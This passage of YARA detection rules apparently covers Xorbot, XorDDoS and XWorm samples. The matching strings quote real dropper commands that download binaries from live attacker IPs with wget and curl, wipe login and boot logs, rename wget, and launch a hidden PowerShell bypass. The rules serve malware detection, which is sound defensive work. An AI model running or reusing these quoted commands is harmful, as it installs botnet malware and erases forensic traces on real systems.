      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/NKsTxnor4wTLR1DtSXpchVNu2DJ5A1Or13; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/6IzllzKrTBU3u6i554E7DngKFoL6lKD216; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/U0OM7XVuD8y3mNII78MBycppSMqBbgCCdn; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/gOKUJZc5QZ3PnVrjyU2uKqv7mKFTcgX2Ui; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vofaOz8tSBDx0czShgUGp5RfLvVJ2ISrka; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/omRBnU12Pl55JFuWXfPl6eInmoKCB4II1B; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/iXAa1XEcIsKM2Wll02D9xQp6WBSiLJC7Ao; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/hzUkKPfvAFXlq1DEM9M9HiYPbbJqhSCvY6; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/kBOrRvdqgY0Z0zoG1Wdu0KuzbBJLAktCls; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/jQsiS6TtLDBeg6dHE4BvT6uYvK761rYxad; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/MZVBRKkgudAiEDlS3vwol314OPYMynYyOp; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/WdQ3o26QvX3ibu0nHnl07wDQXBPxury2P6; curl -" ascii /* score: '30.00'*/
      $s14 = "wget http://178.16.54.252/bins/PRI1JTkEvlYVDoIqG5QYvSkFN7Xg3btHWd; curl -O  http://178.16.54.252/bins/PRI1JTkEvlYVDoIqG5QYvSkFN7" ascii /* score: '27.00'*/
      $s15 = "wget http://178.16.54.252/bins/vofaOz8tSBDx0czShgUGp5RfLvVJ2ISrka; curl -O  http://178.16.54.252/bins/vofaOz8tSBDx0czShgUGp5RfLv" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__b8218a56 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_b8218a56.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b8218a56ac5866789ef92d7bd4f529772518e273514c4d275d7683b5a7d377f4"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/kdpzlTUCVwOqiXWzE6UnuiwZf8ytEaIwFF; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/nt67hvpGFSbItXXjKBUhSgZ959PVn3Qesf; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/rNoraa4v53A84UY2L0erRZjmoc9nPmUheP; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/pneepo9FW6WK2fwBKUBAmY3ymdYot3LNp8; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/4VNsotJGjyB5VcNmfzhAPS9UVNgjvkiKxv; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/dydbehudoQTyiBHPOthirUmTIUP1a9VmZc; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/LSdaCbk7ULpxDOW9czcXKeFWfKnHFIkRGk; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/7buwe8D8WtZpMInuXhXi1smJXavvuUxCiO; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/pXr1FcQJlT8nqOLtxxSu1QWP7yB37bzko8; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zZdTvJUjUJsfozBiUa0OIaAHH7edJ77kDN; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/9AkMb4EK4M0XnOmKPQe1JSMSnzrsLcz4XW; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ZKgCOevuXUonpiUSrABfEE8Ru8Xg164Kr9; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Jmg8PdiZZeVVMwOEZcfPTrDtu5dV2Ix6n1; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/j4XGtxMU46faTqxRDSRpiYubfawxGVrphp; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zZdTvJUjUJsfozBiUa0OIaAHH7edJ77kDN; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__b8e94523 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_b8e94523.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b8e94523553c4b1c56bc2e58f8426cc8c2047c1d762150b54d9b4b8b7118d376"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/fbBzGvKf74LTPeiXTwjWJ422S5eDQ6Ta37; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/CDXcxBwK5Kxm4XOFjbDpj8p4kNr93ZHRMw; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vmQI3MgiWe0KjYfHSYeKcHLUqfFpeARS30; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/MRukTOTdMD6fWirc7Ue4p2siwloR6SqvdL; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/FJrPvT20HavdwSXW6ar8BoKcw5iokrX21x; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PDcmlCKV5RsLG82LXm9JzyHpIMhL2Ll3TJ; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/L5JZY8KgXciCd1K7akLntldI2aTLlMMfGN; curl -" ascii /* score: '30.00'*/
      $s8 = "wget http://178.16.54.252/bins/h4QBiXiztApfh0CnigHruNbQFYJZ2X4LRx; curl -O  http://178.16.54.252/bins/h4QBiXiztApfh0CnigHruNbQFY" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/LM8coFusywZUwRy6MqUbD3ojOF94nAvePX; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/VarYFxtWRiPEqjSCguZZq2woTPCxzAYd39; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/h4QBiXiztApfh0CnigHruNbQFYJZ2X4LRx; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/p09CUNZzprjGy8Ns17g96ktPEpqiD15qqR; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/z96eEFZ9rtBZkw8UC8npIzTTvHDmcB6LxT; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/qO0a9GIiiFeDtkjH9hGMeuz507ZytXN6QT; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/MRukTOTdMD6fWirc7Ue4p2siwloR6SqvdL; curl -O  http://178.16.54.252/bins/MRukTOTdMD6fWirc7Ue4p2siwl" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__c1cc8e2d {
   meta:
      description = "_subset_batch - file Xorbot(signature)_c1cc8e2d.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c1cc8e2dc7f0b702a9bc1f2f173e4356d63d93ce7a0c73bd7443e946ad07cddd"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/N61z5XCjVocjgl69bhzEWDYqsEbad1gJuG; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/JoyPlCtNxidIcKAvhSCb0TxPL3G7xxhZ65; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/G6WqwzrKeAvSWR1FQ5pGcM2EFPpHUwZ3qj; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/4cYEnNjsF8kgwcd4QkNyV2CYqdC19qN1Zz; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Ao9tqdO065WCl6weKFFtN5Fl06dM7v5UoS; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/HgeFNNAaXyGZnUnWaFxbeMcNi9gm5lXS3E; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2W3Sna6l670kaoAzK9WgGw7SYii0x8ryTX; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/TePPcTtrkvth0QNczvTYOz7bJahkW4rmDr; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UhMMXODGrV8KGX5rDTAWEdqp3xnhQYnqdZ; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/gK40BmAO7r9ZEf2t9cmqbMs7wLkG4yM9JS; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Ynl7yd3rL0ZcJ7Afwh3jqPeb3tG15VPkFs; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/S4b0ByqMomPBHutM8Liid4WVwXZijcXrJg; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/cq5guULFn8Z3NtB5f30XZxi74ODMgjus9G; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/InUJBPUweHVE4EfJFwySfSGwxK2cBHQwtq; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/gK40BmAO7r9ZEf2t9cmqbMs7wLkG4yM9JS; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__ca7e48c6 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_ca7e48c6.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ca7e48c6342c9e7d4d18714e6005dcd46251177ded57339494a2108364b07392"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/eHKkGzsAabBt93dTtUsUT8rRme4lXgjj6z; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/1ZMf3lIzqPzYXByiXUYeiVCtafiPZGKTiS; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/mIVd4U7ZUIjFQyIWQr2TkEm6v4qI0Sm0yS; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PSIuqrjJjGLiFqvvRhag6VVoF316baPIlY; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/SLEPyfb2mECKLNxd3rpTRmnXwoccloMg8p; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/56YWQV7akC9w8axpz63UrHMxu3M3jkdWZw; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xR3QF9LOKM0linaDI3ihLs7FNuDrYaU7xw; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/T4R0Nxzgcm5gIsNuPGLzhhnqJpUQoLJkEv; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/znG41g4mhdVfpuvnz6M7J37iwVeV9o3FwR; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/eV9GkGkcBC4V7hpFJdCSrBjaEZWuNLY5YF; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/u34VIXBfAr41QOJSWSYSlcUNCgV4GZrr9O; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/65aSCv0cLJhLkHfb3KiVwGMSsm1kaHNMWa; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/uWvvwRCQv7LUVDTwNDJG4hw5uxDCvYfou7; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/eHKkGzsAabBt93dTtUsUT8rRme4lXgjj6z; curl -" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/uWvvwRCQv7LUVDTwNDJG4hw5uxDCvYfou7; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__e03437d9 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_e03437d9.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e03437d975f80eaf4e308f484cff61aec64c0dbc1b6f591a2b276808b38b1f7d"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/F8FvJ68ujfoNaoKuE8jFFcYLJI7XZjSRiI; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/RknppQSvxA3TnYbb0Zbmp44MwBXCSW9Edp; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/D7E4MIP6UHU5Cm6VTUM6pwguZN8CKk8et9; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/AMavn6sCxDqmypT9YvmOcR9ESInV9b7v8T; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/WSgouws8hYl3XVwdgtLoZqOfv8ymCLtc4n; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/r1rwnig5BySZvD062MMjeBogGxDVBN66Iz; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/XL2Cda7M15CvI5GGv6H1g7Ke7zyqtTruWN; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/bg08Ds8GYv0hZAEPwBV3E3t8EAAyk3azLN; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PN52IwvDTrNhKAhOyy29YuoMYjYTiRamor; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/YT3cwmKa1yO9g19HJqR4ud6AZmMboiVXdq; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xl2SdepW3NXn3BcFnhKA9o106J1VI6mhFt; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/nd9re3q0Ck7r1uex94SFe8X2OFz1D3BHN8; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Whodag3wFPuuTwjOSzKmEej6ZYhxU916sd; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/4zKDmJepJfJzBorrba58eVrLkvfEH5XVq2; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/XL2Cda7M15CvI5GGv6H1g7Ke7zyqtTruWN; curl -O  http://178.16.54.252/bins/XL2Cda7M15CvI5GGv6H1g7Ke7z" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__e5895d2d {
   meta:
      description = "_subset_batch - file Xorbot(signature)_e5895d2d.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e5895d2d2be3ccd845b51c28e164b9bd774962ea442b29ad90372d3702261c31"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/yDfTVVdPQpCtG9m28K6BuA4rk1UKGa2A1U; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/USUIEnX5qRN1CdZw3zEmTaRO0pzYwrQb66; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Q7mTfFy56S1JEu04BeBgjrIadUmkjKODsL; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/159IaLVd2wIPodsVXhbUMceRSuaIeB2Wrz; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/84hjQThxU58Josu5qmkHO3ScQsZv5yYsh7; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/g4RlO8BlYTPr7eiVzrM08JTkw2WGfaokR2; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/BTVduu1tkI2CGeOTQ8QxWFIUQIGX2Vz2gy; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/OjVlOIngZs1E9z8Kib2vgEs8nuXzjNf0hk; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/BCnxRsTWouEgkHSVIGBw3ufHjFbofQyfp1; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/e4RWY1PnU9pqt1EYmGgTBK3ZsxSeyOpqx6; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/d1k1lpnWrYaZcrHqvPvP5hpTQe2ZXSzFu9; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PIyJkojn48vVrlKwvi5xz2dtoAEaO7eO1W; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/mowkvtALqYml4SdEQkQJLRFXd1GCNgFavj; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UxHTHKDfIxNgBfv0ZJ8ed8NE0XHSNV9mlC; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/e4RWY1PnU9pqt1EYmGgTBK3ZsxSeyOpqx6; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__ff94f5cd {
   meta:
      description = "_subset_batch - file Xorbot(signature)_ff94f5cd.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ff94f5cd9405f66916cef674dea203620689fa31a6bee199b4edb3eb99d4d8cd"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/V5MYf3EIglMhyaJrkhy00ZF8QRXtlPpEWN; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2b2uug9CWcZumFqZIfD227XTJyIZmo6t3r; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/eEGuNFkM5ZmvDaqD6qjS5FyHibFV4rjDtd; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/FSBGgNS00i6Bmk3qAtv6xCcMGmrostEv5k; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/4b69sO91Uo7DXfxUFD4vcFFIaHYEcFPzvT; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oHByuMoB2ROBF6ZcJ58egueEaFXtSBfll7; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oCeJm9Yg5s6KJWAkQNz80eXeYPG7lzSSMI; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/WUkFGwbsS4iHfGub8QcfHlDDg5Z5LjRCCF; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/76jx4yMIJ1Qt7g6jzoY9cYhZR4s6UIqus2; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/55rLG1CybC1TvubpipF73ZFqTJiG0zP3rc; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/iqbJg160qDEY4EPc11ud9HffJ9DjfOfwgW; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/lxy9ucGDD90BVzsiN25YTWv9XNf1dqYPiw; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/dvLxAQ7MFddqIxOVjKLXew6pwEKk5VlLQT; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/WUkFGwbsS4iHfGub8QcfHlDDg5Z5LjRCCF; curl -" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2b2uug9CWcZumFqZIfD227XTJyIZmo6t3r; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule XorDDoS_signature_ {
   meta:
      description = "_subset_batch - file XorDDoS(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "007dd96c39a9136151071b5a3bc52956a9842c5dc1e7d3f7e98eecc3b76d520e"
   strings:
      $s1 = "wget http://23.160.56.115/p.txt -O ygljglkjgfg1" fullword ascii /* score: '28.00'*/
      $s2 = "wget http://23.160.56.115/r.txt -O sdf3fslsdf13" fullword ascii /* score: '28.00'*/
      $s3 = "curl http://23.160.56.115/p.txt -o ygljglkjgfg0" fullword ascii /* score: '27.00'*/
      $s4 = "curl http://23.160.56.115/r.txt -o sdf3fslsdf15" fullword ascii /* score: '27.00'*/
      $s5 = "good http://23.160.56.115/p.txt -O ygljglkjgfg2" fullword ascii /* score: '23.00'*/
      $s6 = "good http://23.160.56.115/r.txt -O sdf3fslsdf14" fullword ascii /* score: '23.00'*/
      $s7 = "cat /dev/null > /var/log/boot.log" fullword ascii /* score: '16.00'*/
      $s8 = "mv /bin/wget /bin/good" fullword ascii /* score: '16.00'*/
      $s9 = "cat /dev/null > /var/log/yum.log" fullword ascii /* score: '16.00'*/
      $s10 = "mv /usr/bin/wget /usr/bin/good" fullword ascii /* score: '16.00'*/
      $s11 = "cat /dev/null > /var/log/btmp" fullword ascii /* score: '12.00'*/
      $s12 = "cat /dev/null > /var/log/wtmp" fullword ascii /* score: '12.00'*/
      $s13 = "ls -la /var/run/gcc.pid" fullword ascii /* score: '11.00'*/
      $s14 = "for i in \"/bin\" \"/home\" \"/root\" \"/tmp\" \"/usr\" \"/etc\"" fullword ascii /* score: '10.00'*/
      $s15 = "if [ -w $i ]" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6477 and filesize < 3KB and
      8 of them
}

rule XWorm_signature__abb2f9bd {
   meta:
      description = "_subset_batch - file XWorm(signature)_abb2f9bd.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "abb2f9bdd57bf8ea4e09f93845e6e72fe963832fa3a82f089031c952c7e897e0"
   strings:
      $x1 = "    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Start-Process -WindowStyle Hidden -FilePath '%~f0' -Argume" ascii /* score: '44.00'*/
